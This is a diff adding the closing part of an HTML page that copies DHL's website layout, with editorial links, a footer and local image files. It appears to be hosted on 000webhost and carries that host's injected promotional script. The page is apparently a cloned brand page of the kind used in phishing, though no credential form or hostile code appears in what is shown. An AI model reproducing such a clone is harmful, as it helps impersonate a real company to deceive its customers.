+                                            <!--		$(document).ready(				function($) {					$(".registration-teaser-header").click(						function(){							$(this).toggleClass("active");							$(this).next().slideToggle();						});										// Click on benefits link opens registration teaser and scrolls page						$(".learn-benefits").click(function() {						var $registrationTeaserHeader = $(".registration-teaser-header");						if($registrationTeaserHeader.size() > 0 ) {							// show teaser if not visible							if(!$registrationTeaserHeader.next().is(':visible')) {								$registrationTeaserHeader.click();							}							// scroll page							$('html,body').animate({							  scrollTop: $registrationTeaserHeader.offset().top							}, 1000);						}					});		});	-->
+                                        </script>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="portletShippingOptionsQuery_4" class="wlp-bighorn-window  ">
+                                <div class="wlp-bighorn-titlebar">
+                                    <div class="wlp-bighorn-titlebar-title-panel">Shipping Options Query</div>
+                                    <div class="wlp-bighorn-titlebar-button-panel">&nbsp;</div>
+                                </div>
+                                <div class="wlp-bighorn-window-content"> </div>
+                            </div>
+                            <div id="portletStyledContent_1" class="wlp-bighorn-window  ">
+                                <div class="wlp-bighorn-titlebar">
+                                    <div class="wlp-bighorn-titlebar-title-panel">Styled Content</div>
+                                    <div class="wlp-bighorn-titlebar-button-panel">&nbsp;</div>
+                                </div>
+                                <div class="wlp-bighorn-window-content">
+                                    <div class="portlet-styled-content">
+                                        <h2 class="styled-content-headline">DHL is the global market leader in the logistics industry</h2>
+                                        <div class="lcc-editorial-wrapper lcc-editorial-wrapper-3 clearfix">
+                                            <div class="margin-fix">
+                                                <div class="lcc-editorial clearfix"> <img class="editorial-img" src="./files/japan.jpg" title="Customs Advice" alt="">
+                                                    <h3>Customs Advice</h3>
+                                                    <div class="editorial-txt">How are duties and taxes managed when shipping worldwide?</div> <a class="editorial-link" href="http://www.dhl.com/en/express/customs_support/duties_taxes.html" target="_blank">Continue Reading</a> </div>
+                                                <div class="lcc-editorial clearfix"> <img class="editorial-img" src="./files/italy.jpg" title="Import Services" alt="">
+                                                    <h3>Import Services</h3>
+                                                    <div class="editorial-txt">Import express services to your country with a wide range of DHL delivery options</div> <a class="editorial-link" href="http://www.dhl.com/en/express/import_services.html" target="_blank">Continue Reading</a> </div>
+                                                <div class="lcc-editorial clearfix"> <img class="editorial-img" src="./files/mexico_new.jpg" title="Express Shipping " alt="">
+                                                    <h3>Express Shipping </h3>
+                                                    <div class="editorial-txt">Get the facts upfront from Express Delivery Experts<br><br></div> <a class="editorial-link" href="http://www.dhl.com/en/express/shipping/shipping_advice.html" target="_blank">Continue Reading</a> </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="T130001921281442105601801" class="wlp-bighorn-window  ">
+                                <div class="wlp-bighorn-titlebar">
+                                    <div class="wlp-bighorn-titlebar-title-panel">Styled Content</div>
+                                    <div class="wlp-bighorn-titlebar-button-panel">&nbsp;</div>
+                                </div>
+                                <div class="wlp-bighorn-window-content"> </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="wlp-bighorn-footer">
+            <div class="clearAll"></div>
+            <div id="footer">
+                <div class="container clearfix">
+                    <div class="footer-logo-wrapper"> <img src="./files/dp_dhl_com_transparent.png" title="Deutsche Post DHL" alt="Deutsche Post DHL" class="footer-logo"> <span class="copyright">© 2017</span> </div>
+                    <div class="footer_navigation">
+                        <ul>
+                            <li><a class="first" href="https://www.dhl.de/en/toolbar/footer/impressum.html" target="_blank" onclick="return windowOpener('https://www.dhl.de/en/toolbar/footer/impressum.html', 'window_imprint', false);">Masthead</a></li>
+                            <li><a href="http://www.dhl.com/en/legal.html#t_c" target="_blank" onclick="return windowOpener('http://www.dhl.com/en/legal.html#t_c', 'window_security', false);">Terms &amp; Conditions</a></li>
+                            <li><a class="last" href="http://www.dhl.com/en/legal.html#privacy" target="_blank" onclick="return windowOpener('http://www.dhl.com/en/legal.html#privacy', 'window_privacyCookies', false);">Privacy &amp; Cookies</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="ui-jcalendar-div" class="ui-jcalendar ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div>
+    <div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div>
+    <div id="lcc-overlay" class="overlay">
+        <div id="overlay-content-wrapper"></div>
+    </div>
+<div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website&amp;utm_content=footer_img"><img src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&&notification.length>0&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; right: 0; display: flex; padding: 0 5%}} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important;  margin-bottom: 48px; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">TRANSFER NOW</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #313134; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-color: #ff123a; border-width: 8px;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday Sale",h1Tag.setAttribute("style",'color: white;  margin-top: 48px; font-family: "Roboto", sans-serif; font-size: 48px; font-weight: 600;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Get 90% Off!",h2Tag.setAttribute("style",'color: white; margin: 45px 0; font-family: "Roboto", sans-serif; font-size: 80px; font-weight: 600;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="Don’t miss the opportunity to enjoy up to <strong>4x WordPress Speed, Free SSL and all premium features</strong> available for a fraction of the price!",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 18px; font-weight: 300;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/black-friday-2019-wordpress.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}</script>
+
+<div id="ui-jcalendar-div" class="ui-jcalendar ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div><div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div></body></html>
